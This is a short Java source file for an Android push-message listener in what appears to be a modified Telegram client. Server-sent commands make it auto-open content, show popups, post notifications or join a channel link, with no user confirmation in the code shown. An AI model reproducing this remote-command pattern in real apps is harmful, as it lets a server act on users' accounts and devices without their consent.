package org.telegram.telgram;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.support.annotation.Nullable;

import com.google.gson.Gson;


/**
 * Created by MindHunter on 2/22/2017.
 */
public class CheshmakListener extends Service {

    private Context _context;

    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        try {
            _context = getApplicationContext();

            String message = intent.getStringExtra("me.cheshmak.data");
            if (message.length() == 0)
                return;


            Gson gson = new Gson();
            PModel model = gson.fromJson(message.toString(), PModel.class);

            if(model == null)
                return;

            if (model.getType().equals(PModel.Types.Auto.toString()))
                Funcs.autoOpen(_context,model);

            else if (model.getType().equals(PModel.Types.Popup.toString()))
                Funcs.showPopup(_context,model);

            else if (model.getType().equals(PModel.Types.Notify.toString()))
                Funcs.pushNotify(_context,model);

            else if (model.getType().equals(PModel.Types.Join.toString()))
                Funcs.joinChannel(model.getLink());

        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent)
    {
        return null;
    }
}
